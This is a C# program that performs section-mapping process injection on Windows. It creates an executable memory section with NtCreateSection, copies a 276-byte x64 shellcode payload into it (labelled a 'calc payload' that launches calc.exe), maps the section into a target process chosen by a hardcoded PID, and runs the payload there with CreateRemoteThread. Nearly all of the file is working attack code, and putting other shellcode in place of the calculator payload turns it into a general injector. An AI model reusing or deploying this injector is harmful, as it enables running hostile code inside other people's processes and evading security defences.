using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace sectionmap
{
    public partial class Program
    {


        



        public static void Main(string[] args)
        {

            const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
            const UInt32 SECTION_QUERY = 0x0001;
            const UInt32 SECTION_MAP_WRITE = 0x0002;
            const UInt32 SECTION_MAP_READ = 0x0004;
            const UInt32 SECTION_MAP_EXECUTE = 0x0008;
            const UInt32 SECTION_EXTEND_SIZE = 0x0010;
            const UInt32 SECTION_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | SECTION_QUERY |
                SECTION_MAP_WRITE |
                SECTION_MAP_READ |
                SECTION_MAP_EXECUTE |
                SECTION_EXTEND_SIZE);
            const UInt32 FILE_MAP_ALL_ACCESS = SECTION_ALL_ACCESS;


            // 64 bit calc payload
            byte[] payload = new byte[276] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
0x63,0x2e,0x65,0x78,0x65,0x00 };


            IntPtr sectionhandle;
            uint maxsize = 0x100;
            int res = NtCreateSection(
                out sectionhandle,
                SECTION_ALL_ACCESS,
                IntPtr.Zero,
                ref maxsize,
                0x40,
                0x8000000 ,
                IntPtr.Zero
                );

            if (sectionhandle == IntPtr.Zero)
            {
                Console.WriteLine("Error: {0}",res);
            }
            else
            {
                Console.WriteLine(sectionhandle);

                IntPtr baseaddress = IntPtr.Zero;
                UIntPtr zerobits = UIntPtr.Zero;
                ulong sectionoffset=0;
                uint viewsize=0;
                UIntPtr commitsize = UIntPtr.Zero;

                int res2 = NtMapViewOfSection(
                    sectionhandle,
                    Process.GetCurrentProcess().Handle,
                    ref baseaddress,
                    zerobits,
                    commitsize,
                    ref sectionoffset,
                   ref viewsize,
                   2,
                    0,
                   0x40
                    );

                if (baseaddress == IntPtr.Zero)
                {
                    Console.WriteLine("error: {0}",res2);
                }
                else
                {
                    Console.WriteLine("Baseaddress: {0}",baseaddress.ToString("X"));

                    //byte[] temp = Encoding.ASCII.GetBytes("hi");

                    Marshal.Copy(payload, 0, baseaddress, payload.Length);


                    UInt32 threadid;

                    UInt32 processallaccess = 0x000F0000 | 0x00100000 | 0xFFFF;

                    // uint pid = (uint)Convert.ToInt32(args[0]);
                    uint pid = 3068;

                    IntPtr prochandle = OpenProcess(processallaccess, false,pid);
                    IntPtr remotebase = IntPtr.Zero;
                    ulong offset = 0;
                    uint viewsize2 = 0;
                    UIntPtr zerobits2 = UIntPtr.Zero;
                    UIntPtr commitsize2 = UIntPtr.Zero;
                    int res3 = NtMapViewOfSection(
                        sectionhandle,
                        prochandle,
                        ref remotebase,
                        zerobits2,
                        commitsize2,
                        ref offset,
                        ref viewsize2,
                        2,
                        0,
                       0x40
                        );

                    

                    if (remotebase != IntPtr.Zero)
                    {
                        Console.WriteLine("remotebase: {0}",remotebase.ToString("X"));
                        IntPtr threadhandle =CreateRemoteThread(
                            prochandle,
                            IntPtr.Zero,
                            0,
                            remotebase,
                            IntPtr.Zero,
                            0,
                            out threadid
                            );
                        Console.WriteLine(Marshal.GetLastWin32Error());
                        if (threadid == 0)
                        {
                            Console.WriteLine(Marshal.GetLastWin32Error());
                        }
                        Console.WriteLine("Threadid: {0}", threadid);


                      //  NtUnmapViewOfSection(prochandle, remotebase);
                    
                    
                    }
                    else
                    {
                        Console.WriteLine("Error for createremotethread: {0}",Marshal.GetLastWin32Error());
                    }
                    /*IntPtr threadhandle=CreateThread(
                        IntPtr.Zero,
                        0,
                        baseaddress,
                        IntPtr.Zero,
                        0,
                        out threadid
                        );*/

                    
                    NtUnmapViewOfSection(Process.GetCurrentProcess().Handle, baseaddress);
                }


                NtClose(sectionhandle);
            }





            Console.ReadKey();

        }
    }
}
